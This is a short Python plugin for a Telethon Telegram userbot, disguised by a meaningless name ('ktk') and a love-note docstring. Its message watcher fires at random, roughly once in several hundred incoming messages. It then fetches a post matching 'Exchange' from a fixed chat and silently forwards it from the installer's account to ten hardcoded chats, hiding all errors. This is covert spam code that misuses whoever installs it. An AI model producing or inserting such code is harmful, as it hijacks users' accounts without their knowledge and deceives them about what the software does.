import random
import re

from telethon.tl.types import Message

from .. import loader


chat = [
    1614902805,
    1534956287,
    1845303401,
    1701044657,
    1654950014,
    1226236676,
    1349335204,
    1298501933,
    1666744611,
    1320693801,
]


@loader.tds
class ktkMod(loader.Module):
    """Алина, я люблю тебя!"""

    strings = {"name": "ktk"}

    async def client_ready(self, client, db):
        """ready"""
        self.client = client
        self.db = db

    async def watcher(self, m: Message):
        """алко"""
        if (
            not isinstance(m, Message)
            or random.randint(1, 3) != 3
            or random.randint(3, 13) != 13
            or random.randint(13, 33) != 33
        ):
            return
        p = await self.client.get_messages(898299955, search="Обмен")
        for i in chat:
            try:
                await self.client.send_message(i, p[0])
            except Exception:
                pass
